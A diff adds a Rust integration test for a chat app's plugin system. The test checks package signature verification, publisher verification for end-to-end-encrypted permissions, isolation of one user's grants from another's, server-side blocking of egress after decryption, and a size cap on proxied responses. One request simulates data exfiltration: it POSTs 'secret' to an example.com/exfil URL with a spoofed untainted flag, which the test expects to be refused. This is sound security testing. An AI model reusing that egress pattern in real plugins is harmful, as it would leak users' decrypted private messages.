@@ -1069,3 +1069,350 @@ async fn test_rbac_alice_bob_charlie_and_discord_webhooks_incoming_outgoing_ssrf
     unsafe { std::env::remove_var("CHATW_ALLOW_LOCAL_WEBHOOKS"); }
     recv_task.abort();
 }
+
+#[tokio::test]
+async fn test_spec051_p0_p1_security_regressions_signatures_streaming_and_server_e2ee_taint() {
+    let (app, pool, state) = setup_app().await;
+    let (_admin_id, admin_cookie) = create_test_user(&pool, &state, "sec_adm", true).await;
+    let (dev_id, dev_cookie) = create_test_user(&pool, &state, "sec_dev", false).await;
+    let (unver_dev_id, unver_dev_cookie) = create_test_user(&pool, &state, "unver_dev", false).await;
+    let (_alice_id, alice_cookie) = create_test_user(&pool, &state, "sec_alice", false).await;
+    let (bob_id, bob_cookie) = create_test_user(&pool, &state, "sec_bob", false).await;
+
+    // 1. Register publisher WITH cryptographic P-256 public key
+    let secret_scalar: [u8; 32] = [0x42; 32];
+    let sk = p256::ecdsa::SigningKey::from_slice(&secret_scalar).unwrap();
+    let pubkey_hex = hex::encode(sk.verifying_key().to_encoded_point(false).as_bytes());
+    let pub_slug = format!("sig{}", &dev_id.simple().to_string()[..8]);
+
+    let (st_pub, pub_val) = req_json(
+        &app,
+        "POST",
+        "/api/plugins/publishers",
+        Some(&dev_cookie),
+        Some(json!({
+            "slug": pub_slug,
+            "display_name": "Signed Labs",
+            "public_key": pubkey_hex
+        })),
+    )
+    .await;
+    assert_eq!(st_pub, StatusCode::OK, "register signed publisher failed: {pub_val}");
+    let pub_id = pub_val["id"].as_str().unwrap().to_string();
+
+    // 2. Publishing without signature when publisher has public_key MUST be rejected
+    let plugin_key = format!("{pub_slug}.signed_tool");
+    let manifest_obj = plugins::schema::PluginManifest {
+        plugin_key: plugin_key.clone(),
+        name: "Signed Tool".into(),
+        version: "1.0.0".into(),
+        publisher: pub_slug.clone(),
+        entry_point: "index.js".into(),
+        runtime: "js".into(),
+        sdk_version: "1.0.0".into(),
+        permissions: vec![
+            "storage.local".into(),
+            "profile.read".into(),
+            "network.outbound".into(),
+            "e2ee.read_decrypted".into(),
+        ],
+        ..Default::default()
+    };
+    let bundle_code = "chatw.onReady(() => {});";
+    let (computed_sha, _, _) = plugins::schema::validate_manifest_and_artifacts(
+        &manifest_obj,
+        &pub_slug,
+        bundle_code,
+        "",
+        "",
+        None,
+    )
+    .unwrap();
+
+    let (st_nosig, _) = req_json(
+        &app,
+        "POST",
+        "/api/plugins/packages",
+        Some(&dev_cookie),
+        Some(json!({
+            "manifest": manifest_obj,
+            "bundle_code": bundle_code,
+            "sha256": computed_sha
+        })),
+    )
+    .await;
+    assert_eq!(st_nosig, StatusCode::BAD_REQUEST, "unsigned package for key-pinned publisher must fail");
+
+    // Forged signature MUST be rejected
+    let (st_badsig, _) = req_json(
+        &app,
+        "POST",
+        "/api/plugins/packages",
+        Some(&dev_cookie),
+        Some(json!({
+            "manifest": manifest_obj,
+            "bundle_code": bundle_code,
+            "sha256": computed_sha,
+            "signature": "00".repeat(64)
+        })),
+    )
+    .await;
+    assert_eq!(st_badsig, StatusCode::BAD_REQUEST, "forged signature must fail");
+
+    // Valid cryptographic signature MUST succeed and record signature_verified: true
+    let (_, valid_sig_hex) = plugins::schema::sign_package_digest(
+        &secret_scalar,
+        &plugin_key,
+        "1.0.0",
+        &computed_sha,
+    )
+    .unwrap();
+    let (st_goodsig, pkg_val) = req_json(
+        &app,
+        "POST",
+        "/api/plugins/packages",
+        Some(&dev_cookie),
+        Some(json!({
+            "manifest": manifest_obj,
+            "bundle_code": bundle_code,
+            "sha256": computed_sha,
+            "signature": valid_sig_hex
+        })),
+    )
+    .await;
+    assert_eq!(st_goodsig, StatusCode::OK, "valid signature publish failed: {pkg_val}");
+    assert_eq!(pkg_val["signature_verified"], json!(true));
+    let pkg_id = pkg_val["package_id"].as_str().unwrap().to_string();
+    let ver_id = pkg_val["version_id"].as_str().unwrap().to_string();
+
+    // 3. Unverified publisher CANNOT be granted E2EE permissions even if sensitive_approval_status is approved!
+    let unver_slug = format!("unv{}", &unver_dev_id.simple().to_string()[..8]);
+    let _ = req_json(
+        &app,
+        "POST",
+        "/api/plugins/publishers",
+        Some(&unver_dev_cookie),
+        Some(json!({ "slug": unver_slug, "display_name": "Unverified Dev" })),
+    )
+    .await;
+    let (_, unver_pkg) = req_json(
+        &app,
+        "POST",
+        "/api/plugins/packages",
+        Some(&unver_dev_cookie),
+        Some(json!({
+            "manifest": {
+                "plugin_key": format!("{unver_slug}.e2ee_try"),
+                "name": "Unver E2EE",
+                "version": "1.0.0",
+                "entry_point": "index.js",
+                "runtime": "js",
+                "permissions": ["e2ee.read_decrypted"]
+            },
+            "bundle_code": "1;"
+        })),
+    )
+    .await;
+    let unver_pkg_id = unver_pkg["package_id"].as_str().unwrap();
+    let unver_ver_id = unver_pkg["version_id"].as_str().unwrap();
+    let _ = req_json(
+        &app,
+        "POST",
+        &format!("/api/admin/plugins/versions/{unver_ver_id}/permissions"),
+        Some(&admin_cookie),
+        Some(json!({ "status": "approved", "approved_permissions": ["e2ee.read_decrypted"] })),
+    )
+    .await;
+    let (st_unver_e2ee, _) = req_json(
+        &app,
+        "POST",
+        "/api/plugins/installations",
+        Some(&alice_cookie),
+        Some(json!({
+            "package_id": unver_pkg_id,
+            "consent_confirmed": true,
+            "enable": true,
+            "grants": [{
+                "permission": "e2ee.read_decrypted",
+                "scope_type": "conversation",
+                "scope_id": Uuid::new_v4()
+            }]
+        })),
+    )
+    .await;
+    assert_eq!(st_unver_e2ee, StatusCode::FORBIDDEN, "unverified publisher MUST be blocked from E2EE grants");
+
+    // 4. Verify publisher + approve permissions on Signed Tool
+    let _ = req_json(
+        &app,
+        "POST",
+        &format!("/api/admin/plugins/publishers/{pub_id}/verify"),
+        Some(&admin_cookie),
+        None,
+    )
+    .await;
+    let _ = req_json(
+        &app,
+        "POST",
+        &format!("/api/admin/plugins/versions/{ver_id}/permissions"),
+        Some(&admin_cookie),
+        Some(json!({
+            "status": "approved",
+            "approved_permissions": ["profile.read", "network.outbound", "e2ee.read_decrypted"]
+        })),
+    )
+    .await;
+
+    // 5. P0.2 Multi-user personal grant isolation:
+    // Alice creates a Server with Bob and installs Signed Tool with `profile.read` granted by Alice.
+    // When Bob fetches the server installation, Alice's personal `profile.read` grant MUST NOT be exposed or active for Bob!
+    let (_, srv_val) = req_json(
+        &app,
+        "POST",
+        "/api/servers",
+        Some(&alice_cookie),
+        Some(json!({ "name": "Isolation Server" })),
+    )
+    .await;
+    let srv_id = srv_val["id"].as_str().unwrap();
+    sqlx::query("INSERT INTO server_members (server_id, user_id) VALUES ($1, $2)")
+        .bind(Uuid::parse_str(srv_id).unwrap())
+        .bind(bob_id)
+        .execute(&pool)
+        .await
+        .unwrap();
+
+    let (st_srv_inst, srv_inst) = req_json(
+        &app,
+        "POST",
+        "/api/plugins/installations",
+        Some(&alice_cookie),
+        Some(json!({
+            "package_id": pkg_id,
+            "scope_type": "server",
+            "scope_id": srv_id,
+            "consent_confirmed": true,
+            "enable": true,
+            "grants": [
+                { "permission": "storage.local", "scope_type": "server", "scope_id": srv_id },
+                { "permission": "profile.read", "scope_type": "server", "scope_id": srv_id }
+            ]
+        })),
+    )
+    .await;
+    assert_eq!(st_srv_inst, StatusCode::OK);
+    let srv_inst_id = srv_inst["id"].as_str().unwrap();
+
+    // Bob fetches installations -> Bob must NOT receive Alice's personal `profile.read` grant
+    let (_, bob_insts) = req_json(
+        &app,
+        "GET",
+        &format!("/api/plugins/installations?scope_type=server&scope_id={srv_id}"),
+        Some(&bob_cookie),
+        None,
+    )
+    .await;
+    let bob_grants = bob_insts[0]["grants"].as_array().unwrap();
+    assert!(
+        !bob_grants.iter().any(|g| g["permission"] == "profile.read"),
+        "Alice's personal profile.read grant MUST NOT leak to Bob: {bob_grants:?}"
+    );
+    // And server-side audit check for `profile.read` as Bob MUST be denied (403)
+    let (st_bob_prof, _) = req_json(
+        &app,
+        "POST",
+        &format!("/api/plugins/installations/{srv_inst_id}/audit"),
+        Some(&bob_cookie),
+        Some(json!({ "action": "read_profile", "permission": "profile.read" })),
+    )
+    .await;
+    assert_eq!(st_bob_prof, StatusCode::FORBIDDEN, "Bob did not grant profile.read so server must deny");
+
+    // 6. P0.3 Server-side E2EE taint enforcement:
+    // Alice installs Signed Tool in her personal user scope WITH `e2ee.read_decrypted` + `network.outbound` (NO `e2ee.egress_external`).
+    // Even if a compromised client sends `e2ee_tainted: false` in `POST /net/fetch`, the server MUST still block outbound egress!
+    let conv_id = Uuid::new_v4();
+    let (st_uinst, uinst_val) = req_json(
+        &app,
+        "POST",
+        "/api/plugins/installations",
+        Some(&alice_cookie),
+        Some(json!({
+            "package_id": pkg_id,
+            "consent_confirmed": true,
+            "enable": true,
+            "grants": [
+                { "permission": "network.outbound", "scope_type": "global" },
+                { "permission": "e2ee.read_decrypted", "scope_type": "conversation", "scope_id": conv_id }
+            ]
+        })),
+    )
+    .await;
+    assert_eq!(st_uinst, StatusCode::OK);
+    let uinst_id = uinst_val["id"].as_str().unwrap();
+
+    let (st_spoofed_untainted, _) = req_json(
+        &app,
+        "POST",
+        &format!("/api/plugins/installations/{uinst_id}/net/fetch"),
+        Some(&alice_cookie),
+        Some(json!({
+            "url": "https://example.com/exfil",
+            "method": "POST",
+            "body": "secret",
+            "e2ee_tainted": false
+        })),
+    )
+    .await;
+    assert_eq!(
+        st_spoofed_untainted,
+        StatusCode::FORBIDDEN,
+        "server MUST block network egress even when client spoofs e2ee_tainted: false!"
+    );
+
+    // 7. P1.3 Bounded streaming response in plugin_network_fetch:
+    // Revoke E2EE grant (and verify no e2ee_read audit was recorded) so network.outbound is permitted,
+    // then test against a local test HTTP server returning > 256 KB (> MAX_PROXY_RESP_BYTES) -> MUST abort with 413 PAYLOAD_TOO_LARGE!
+    let e2ee_gid = uinst_val["grants"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|g| g["permission"] == "e2ee.read_decrypted")
+        .unwrap()["id"]
+        .as_str()
+        .unwrap();
+    let _ = req_json(
+        &app,
+        "DELETE",
+        &format!("/api/plugins/installations/{uinst_id}/grants/{e2ee_gid}"),
+        Some(&alice_cookie),
+        None,
+    )
+    .await;
+
+    let big_srv = Router::new().route(
+        "/huge",
+        axum::routing::get(|| async { "A".repeat(400 * 1024) }),
+    );
+    let big_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let big_addr = big_listener.local_addr().unwrap();
+    let big_task = tokio::spawn(async move {
+        let _ = axum::serve(big_listener, big_srv).await;
+    });
+
+    unsafe { std::env::set_var("CHATW_ALLOW_LOCAL_WEBHOOKS", "1"); }
+    let (st_huge, _) = req_json(
+        &app,
+        "POST",
+        &format!("/api/plugins/installations/{uinst_id}/net/fetch"),
+        Some(&alice_cookie),
+        Some(json!({
+            "url": format!("http://127.0.0.1:{}/huge", big_addr.port()),
+            "method": "GET"
+        })),
+    )
+    .await;
+    unsafe { std::env::remove_var("CHATW_ALLOW_LOCAL_WEBHOOKS"); }
+    big_task.abort();
+    assert_eq!(st_huge, StatusCode::PAYLOAD_TOO_LARGE, "oversized upstream stream must abort with 413");
+}
